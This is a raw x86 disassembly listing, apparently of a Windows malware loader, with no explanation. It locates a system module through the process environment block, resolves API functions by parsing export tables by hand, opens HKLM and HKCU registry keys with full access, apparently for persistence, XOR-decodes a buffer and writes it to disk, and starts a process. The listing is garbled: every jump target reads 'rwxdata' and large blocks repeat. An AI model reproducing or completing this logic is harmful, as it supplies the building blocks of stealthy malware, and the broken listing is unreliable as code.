mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_45cf70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_45d0a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_45c27d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_45cf70
add esp 0x4
call sub_45d130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_45d160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_45d160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_45cf70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_45cf70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_45cf70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_45cf70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_45cf70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x264 ]
add edx 0x70
push edx
call sub_45cf70
add esp 0x4
mov eax [ ebp - 0x264 ]
add eax 0x70
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x298 ]
mov [ ebp - 0x2b4 ] eax
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
push 0xfb18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_45d0a0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0xfb18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_45cf70
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_45d0a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_45d130
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_45d160
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx [ ecx + 0x78 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jae rwxdata
xor eax eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x20 ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp - 0x10 ]
